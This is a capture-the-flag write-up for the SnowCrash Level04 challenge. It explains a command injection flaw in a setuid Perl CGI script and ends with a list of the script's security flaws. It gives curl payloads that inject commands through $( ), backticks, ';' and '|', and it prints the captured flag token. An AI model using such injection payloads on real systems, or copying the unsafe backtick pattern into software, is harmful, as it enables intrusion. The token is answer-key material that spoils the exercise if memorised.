# Level04 Solution

## Starting VM

```bash
qemu-system-x86_64 -m 2048 -cdrom ./SnowCrash.iso -boot d -net nic,model=virtio -net user,hostfwd=tcp::4242-:4242
```

## Objective
Exploit a Perl CGI script with command injection vulnerability to retrieve the flag04 token.

## Vulnerability
The `level04.pl` Perl CGI script runs with setuid flag04 privileges and has a command injection vulnerability:

```perl
sub x {
  $y = $_[0];
  print `echo $y 2>&1`;  # User input directly in backticks - NO VALIDATION
}
x(param("x"));
```

**The Problem**: Backticks execute in a shell context and interpret metacharacters like `$()`, `;`, `|`.

## Exploitation

### Using Command Substitution
```bash
curl "http://localhost:4747/?x=\$(getflag)"
```

This becomes: `echo $(getflag) 2>&1` which executes getflag with flag04 privileges.

### Other Methods
- **Backticks**: `curl "http://localhost:4747/?x=\`getflag\`"`
- **Semicolon**: `curl "http://localhost:4747/?x=test%3Bid"` (URL-encoded `;`)
- **Pipe**: `curl "http://localhost:4747/?x=test%7Cgetflag"` (URL-encoded `|`)

## Result
```
Check flag.Here is your token : ne2searoevaevoem4ov4ar8ap
```

## Security Flaws

1. **No input validation**: User input directly used in shell execution
2. **Shell interpretation**: Backticks invoke shell with full metacharacter support
3. **Setuid privileges**: Amplifies impact to flag04 permissions
4. **No safe APIs used**: Should use `system("cmd", $arg)` array form instead

## Answer

**Level04 Token**: `ne2searoevaevoem4ov4ar8ap`
**Vulnerability**: OS Command Injection via Perl CGI backticks
**Impact**: Arbitrary Code Execution with flag04 privileges
